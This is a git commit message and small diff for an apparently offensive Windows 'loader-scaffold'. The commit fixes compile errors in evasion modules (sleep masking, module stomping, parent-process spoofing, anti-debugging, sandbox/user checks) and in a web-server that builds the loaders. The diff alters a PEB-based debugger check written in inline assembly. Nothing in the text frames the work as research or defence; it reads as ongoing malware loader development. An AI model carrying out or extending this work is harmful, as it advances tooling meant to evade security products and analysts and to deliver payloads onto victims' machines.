fix: cross-compile loader and deploy web-server for manual testing
Fix compilation errors for x86_64-pc-windows-gnu target:
- sleep_mask: guard masked_sleep_kernel32 with not(target_arch=x86_64)
  to prevent kernel32 IAT imports from leaking into x64 build; remove
  x64 fallback call that referenced the non-x64-only function
- module_stomp, ppid_spoof: replace TakeWhile::as_slice() (removed in
  recent nightly) with count()+slice indexing
- anti_debug: change u8 asm output to u32 (reg class requires ≥16-bit)
- usercheck: save/restore rbx around cpuid since LLVM reserves rbx for
  internal use; remove the explicit out("ebx") _ operand

Fix web-server scaffold build:
- scaffold.rs: use correct rlib name (libloader_scaffold, not libscaffold)
  and skip rebuild when rlib already exists; set RUSTC/CARGO env vars to
  use the nightly toolchain that has the windows-gnu target installed
- config.rs: update default scaffold_rlib path to match actual rlib name
- .cargo/config.toml: add -C lto=off for windows-gnu target (prebuilt
  stdlib ships COFF objects, not LLVM bitcode; linker-plugin-lto fails)

+++ loader-scaffold/src/evasion/anti_debug.rs
@@ -25,7 +25,7 @@ unsafe fn nqip_usize(class: usize) -> (i32, usize) {
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 pub unsafe fn is_debugged() -> bool {
     // PEB.BeingDebugged via GS register (no API call)
-    let being_debugged: u8;
+    let being_debugged: u32;
     core::arch::asm!(
         "mov rax, gs:[0x60]",
         "movzx {0:e}, byte ptr [rax + 0x2]",
